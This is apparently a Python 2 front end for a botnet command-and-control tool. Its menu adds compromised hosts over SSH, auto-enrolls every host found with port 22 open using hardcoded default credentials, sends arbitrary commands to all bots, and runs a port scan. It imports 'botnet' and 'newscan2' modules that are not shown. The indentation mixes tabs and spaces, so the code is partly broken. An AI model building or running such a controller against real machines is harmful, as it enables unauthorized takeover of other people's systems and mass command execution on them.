#!/usr/bin/python

import os
import sys

a = True
while a:
	print "#####################"
	print " Command and Control"
	print "#####################"


	print "1. Add a Client(manually)"
	print "2. Add a Client(automatically)"
	print "3. Send a command"
	print "4. Nmap Scan"
	print ""
	print ""
	print "99. Quit"

	userin = raw_input(">")

	while userin != '1' and userin != '2' and userin != '3' and userin != '4' and userin != '99':
		userin = raw_input(">")
	
	if userin == '1':
		import getpass
		from botnet import *
		host = raw_input("Enter a host: ")
		user = raw_input("Enter a user: ")
		pswd = getpass.getpass('Enter the password: ')
		addClient(host, user, pswd)
	elif userin == '2':
		import getpass
                from botnet import *
		from newscan2 import *
		scan = './newscan2.py -sS -p 22 -t 127.0.0.0/30'
		os.system(scan)
                user = 'hello'
		pswd = 'pass'
		print openport
		for i in openport:
			host = i
                	addClient(host, user, pswd)	
	elif userin == '3':
		from botnet import *
		cmd = raw_input("Enter a command: ")
		botnetCommand(cmd)
	
	elif userin == '4':
		#hosts = raw_input("Enter a host (e.g. 127.0.0.1 or 192.168.1.0/24) : ")
		#scan = './newscan2.py -sS -p 22 -t ' + hosts
		#os.system(scan)
		from newscan2 import *
		main()
		
	elif userin == '99':
		exit(0)

